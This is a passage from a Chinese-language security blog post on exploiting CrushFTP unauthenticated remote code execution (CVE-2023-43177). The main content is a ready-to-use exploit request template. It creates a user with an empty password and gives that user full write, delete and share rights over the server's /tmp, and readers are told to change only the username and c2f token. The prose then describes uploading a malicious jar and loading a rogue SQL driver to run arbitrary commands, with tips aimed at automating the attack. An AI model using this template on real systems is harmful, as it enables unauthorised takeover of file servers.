class="line">command=setUserItem&amp;data_action=replace&amp;serverGroup=extra_vfs&amp;username=crushadmin~Y4Test&amp;user=%3C%3Fxml+version%3D%221.0%22+encoding%3D%22UTF-8%22%3F%3E%3Cuser+type%3D%22properties%22%3E%3Cusername%3Ecrushadmin~Y4Test%3C%2Fusername%3E%3Cpassword%3E%3C%2Fpassword%3E%3Cmax_logins%3E0%3C%2Fmax_logins%3E%3Croot_dir%3E%2F%3C%2Froot_dir%3E%3C%2Fuser%3E&amp;xmlItem=user&amp;vfs_items=%3C%3Fxml+version%3D%221.0%22+encoding%3D%22UTF-8%22%3F%3E%0D%0A%3Cvfs_items+type%3D%22vector%22%3E%0D%0A%3Cvfs_items_subitem+type%3D%22properties%22%3E%0D%0A%3Cname%3EY4TMP%3C%2Fname%3E%0D%0A%3Cpath%3E%2F%3C%2Fpath%3E%0D%0A%3Cvfs_item+type%3D%22vector%22%3E%0D%0A%3Cvfs_item_subitem+type%3D%22properties%22%3E%0D%0A%3Ctype%3EDIR%3C%2Ftype%3E%0D%0A%3Curl%3E%3C%2Furl%3E%0D%0A%3C%2Fvfs_item_subitem%3E%0D%0A%3C%2Fvfs_item%3E%0D%0A%3C%2Fvfs_items_subitem%3E%0D%0A%3Cvfs_items_subitem+type%3D%22properties%22%3E%0D%0A%3Cname%3Etmp%3C%2Fname%3E%0D%0A%3Cpath%3E%2FY4TMP%2F%3C%2Fpath%3E%0D%0A%3Cvfs_item+type%3D%22vector%22%3E%0D%0A%3Cvfs_item_subitem+type%3D%22properties%22%3E%0D%0A%3Ctype%3EDIR%3C%2Ftype%3E%0D%0A%3Curl%3EFILE%3A%2F%2FVolumes%2FMacintosh+HD%2Ftmp%2F%3C%2Furl%3E%0D%0A%3C%2Fvfs_item_subitem%3E%0D%0A%3C%2Fvfs_item%3E%0D%0A%3C%2Fvfs_items_subitem%3E%0D%0A%3C%2Fvfs_items%3E&amp;permissions=%3C%3Fxml+version%3D%221.0%22+encoding%3D%22UTF-8%22%3F%3E%0D%0A%3CVFS+type%3D%22properties%22%3E%0D%0A%3Citem+name%3D%22%2F%22%3E(read)(view)(resume)%3C%2Fitem%3E%0D%0A%3Citem+name%3D%22%2FY4TMP%2F%22%3E(read)(view)(resume)%3C%2Fitem%3E%0D%0A%3Citem+name%3D%22%2FY4TMP%2FTMP%2F%22%3E(read)(write)(view)(delete)(deletedir)(makedir)(rename)(resume)(share)%3C%2Fitem%3E%0D%0A%3C%2FVFS%3E&amp;c2f=kYjk</span><br></pre></td></tr></table></figure><p>对应以下的参数，按照此模板做修改即可注意替换username(用户名~随意的自定义参数|参考上面的图上面的截图就很容易理解)、c2f参数即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">command: setUserItem</span><br><span class="line">data_action: replace</span><br><span class="line">serverGroup: extra_vfs</span><br><span class="line">username: crushadmin~Y4Test</span><br><span class="line">user: &lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;&lt;user type=<span class="string">&quot;properties&quot;</span>&gt;&lt;username&gt;crushadmin~Y4Test&lt;/username&gt;&lt;password&gt;&lt;/password&gt;&lt;max_logins&gt;<span class="number">0</span>&lt;/max_logins&gt;&lt;root_dir&gt;/&lt;/root_dir&gt;&lt;/user&gt;</span><br><span class="line">xmlItem: user</span><br><span class="line">vfs_items: &lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="line">&lt;vfs_items type=<span class="string">&quot;vector&quot;</span>&gt;</span><br><span class="line">&lt;vfs_items_subitem type=<span class="string">&quot;properties&quot;</span>&gt;</span><br><span class="line">&lt;name&gt;Y4TMP&lt;/name&gt;</span><br><span class="line">&lt;path&gt;/&lt;/path&gt;</span><br><span class="line">&lt;vfs_item type=<span class="string">&quot;vector&quot;</span>&gt;</span><br><span class="line">&lt;vfs_item_subitem type=<span class="string">&quot;properties&quot;</span>&gt;</span><br><span class="line">&lt;type&gt;DIR&lt;/type&gt;</span><br><span class="line">&lt;url&gt;&lt;/url&gt;</span><br><span class="line">&lt;/vfs_item_subitem&gt;</span><br><span class="line">&lt;/vfs_item&gt;</span><br><span class="line">&lt;/vfs_items_subitem&gt;</span><br><span class="line">&lt;vfs_items_subitem type=<span class="string">&quot;properties&quot;</span>&gt;</span><br><span class="line">&lt;name&gt;tmp&lt;/name&gt;</span><br><span class="line">&lt;path&gt;/Y4TMP/&lt;/path&gt;</span><br><span class="line">&lt;vfs_item type=<span class="string">&quot;vector&quot;</span>&gt;</span><br><span class="line">&lt;vfs_item_subitem type=<span class="string">&quot;properties&quot;</span>&gt;</span><br><span class="line">&lt;type&gt;DIR&lt;/type&gt;</span><br><span class="line">&lt;url&gt;FILE:<span class="comment">//Volumes/Macintosh HD/tmp/&lt;/url&gt;</span></span><br><span class="line">&lt;/vfs_item_subitem&gt;</span><br><span class="line">&lt;/vfs_item&gt;</span><br><span class="line">&lt;/vfs_items_subitem&gt;</span><br><span class="line">&lt;/vfs_items&gt;</span><br><span class="line">permissions: &lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="line">&lt;VFS type=<span class="string">&quot;properties&quot;</span>&gt;</span><br><span class="line">&lt;item name=<span class="string">&quot;/&quot;</span>&gt;(read)(view)(resume)&lt;/item&gt;</span><br><span class="line">&lt;item name=<span class="string">&quot;/Y4TMP/&quot;</span>&gt;(read)(view)(resume)&lt;/item&gt;</span><br><span class="line">&lt;item name=<span class="string">&quot;/Y4TMP/TMP/&quot;</span>&gt;(read)(write)(view)(delete)(deletedir)(makedir)(rename)(resume)(share)&lt;/item&gt;</span><br><span class="line">&lt;/VFS&gt;</span><br><span class="line">c2f: kYjk</span><br></pre></td></tr></table></figure><p>之后在主页上传jar包<img src="/2023/12/10/year/2023/12/CrushFTP-Unauthenticated-Remote-Code-Execution-CVE-2023-43177/image-20231211132022476.png" alt="image-20231211132022476"></p><p>抓了个包发现这样非常麻烦，需要两步，第一步相当于初始化，第二步还要计算文件大小拼接(19218是文件大小)</p><p><img src="/2023/12/10/year/2023/12/CrushFTP-Unauthenticated-Remote-Code-Execution-CVE-2023-43177/image-20231211133549918.png" alt="image-20231211133549918"></p><p>通过阅读源码我发现了一个可替代的步骤，并且更简单，简化我们做自动化利用的步骤</p><p><img src="/2023/12/10/year/2023/12/CrushFTP-Unauthenticated-Remote-Code-Execution-CVE-2023-43177/image-20231211133757762.png" alt="image-20231211133757762"></p><p>现在既然成功上传了，那就可以控制参数加载我们的恶意SQL驱动程序执行任意命令</p><p><img src="/2023/12/10/year/2023/12/CrushFTP-Unauthenticated-Remote-Code-Execution-CVE-2023-43177/image-20231211132908890.png" alt="image-20231211132908890"></p></div></article><div class="blog-post-comments"><div id="utterances_thread"><noscript>Please enable JavaScript to view the comments.</noscript></div></div><div id="footer-post-container"><div id="footer-post"><div id="nav-footer" style="display:none"><ul><li><a href="/">Home</a></li><li><a href="/archives/">Writing</a></li><li><a href="/tags/">Topics</a></li><li><a href="/search/">Search</a></li><li><a href="/about/">About</a></li><li><a href="/link/">Friends</a></li></ul></div><div id="toc-footer" style="display:none"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CrushFTP-Unauthenticated-Remote-Code-Execution"><span class="toc-number">1.</span> <span class="toc-text">CrushFTP Unauthenticated Remote Code Execution</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B7%AF%E7%94%B1%E5%88%86%E6%9E%90"><span class="toc-number">1.1.</span> <span class="toc-text">路由分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E5%8F%B0%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87"><span class="toc-number">1.2.</span> <span class="toc-text">前台权限绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-number">1.3.</span> <span class="toc-text">后台代码执行</span></a></li></ol></li></ol></div><div id="share-footer" style="display:none"><ul><li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://y4tacker.github.io/2023/12/10/year/2023/12/CrushFTP-Unauthenticated-Remote-Code-Execution-CVE-2023-43177/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://y4tacker.github.io/2023/12/10/year/2023/12/CrushFTP-Unauthenticated-Remote-Code-Execution-CVE-2023-43177/&text=CrushFTP Unauthenticated Remote Code Execution(CVE-2023-43177)"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://y4tacker.github.io/2023/12/10/year/2023/12/CrushFTP-Unauthenticated-Remote-Code-Execution-CVE-2023-43177/&title=CrushFTP Unauthenticated Remote Code Execution(CVE-2023-43177)"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://y4tacker.github.io/2023/12/10/year/2023/12/CrushFTP-Unauthenticated-Remote-Code-Execution-CVE-2023-43177/&is_video=false&description=CrushFTP Unauthenticated Remote Code Execution(CVE-2023-43177)"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" href="mailto:?subject=CrushFTP Unauthenticated Remote Code Execution(CVE-2023-43177)&body=Check out this article: https://y4tacker.github.io/2023/12/10/year/2023/12/CrushFTP-Unauthenticated-Remote-Code-Execution-CVE-2023-43177/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://y4tacker.github.io/2023/12/10/year/2023/12/CrushFTP-Unauthenticated-Remote-Code-Execution-CVE-2023-43177/&title=CrushFTP Unauthenticated Remote Code Execution(CVE-2023-43177)"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://y4tacker.github.io/2023/12/10/year/2023/12/CrushFTP-Unauthenticated-Remote-Code-Execution-CVE-2023-43177/&title=CrushFTP Unauthenticated Remote Code Execution(CVE-2023-43177)"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://y4tacker.github.io/2023/12/10/year/2023/12/CrushFTP-Unauthenticated-Remote-Code-Execution-CVE-2023-43177/&title=CrushFTP Unauthenticated Remote Code Execution(CVE-2023-43177)"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://y4tacker.github.io/2023/12/10/year/2023/12/CrushFTP-Unauthenticated-Remote-Code-Execution-CVE-2023-43177/&title=CrushFTP Unauthenticated Remote Code Execution(CVE-2023-43177)"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://y4tacker.github.io/2023/12/10/year/2023/12/CrushFTP-Unauthenticated-Remote-Code-Execution-CVE-2023-43177/&name=CrushFTP Unauthenticated Remote Code Execution(CVE-2023-43177)&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://y4tacker.github.io/2023/12/10/year/2023/12/CrushFTP-Unauthenticated-Remote-Code-Execution-CVE-2023-43177/&t=CrushFTP Unauthenticated Remote Code Execution(CVE-2023-43177)"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li></ul></div><div id="actions-footer"><a id="menu" class="icon" href="#" onclick='return $("#nav-footer").toggle(),!1'><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a> <a id="toc" class="icon" href="#" onclick='return $("#toc-footer").toggle(),!1'><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a> <a id="share" class="icon" href="#" onclick='return $("#share-footer").toggle(),!1'><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a> <a id="top" style="display:none" class="icon" href="#" onclick='$("html, body").animate({scrollTop:0},"fast")'><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></div></div></div><footer id="footer"><div class="footer-left">Copyright &copy; 2016-2025 Y4tacker</div><div class="footer-right"><nav><ul><li><a href="/">Home</a></li><li><a href="/archives/">Writing</a></li><li><a href="/tags/">Topics</a></li><li><a href="/search/">Search</a></li><li><a href="/about/">About</a></li><li><a href="/link/">Friends</a></li></ul><ul><span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次 </span><span class="post-meta-divider">|</span> <span id="busuanzi_container_site_uv" style="display:none">本站访客数<span id="busuanzi_value_site_uv"></span>人</span><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></ul></nav></div></footer></div><link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload='this.onload=null,this.rel="stylesheet"'><script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script><script type="text/javascript">$(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })</script><script src="/js/main.js"></script><script type="text/javascript">var _hmt=_hmt||[];!function(){var e=document.createElement("script");e.src="https://hm.baidu.com/hm.js?e6d8a6d6d91254d9108e469862e88709";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)}()</script><script type="text/javascript">var utterances_repo="Y4tacker/y4tacker.github.io",utterances_issue_term="pathname",utterances_label="Comment",utterances_theme="github-dark";!function(){var t=document.createElement("script");t.src="https://utteranc.es/client.js",t.setAttribute("repo",utterances_repo),t.setAttribute("issue-term","pathname"),t.setAttribute("label",utterances_label),t.setAttribute("theme",utterances_theme),t.setAttribute("crossorigin","anonymous"),t.async=!0,document.getElementById("utterances_thread").appendChild(t)}()</script></body></html>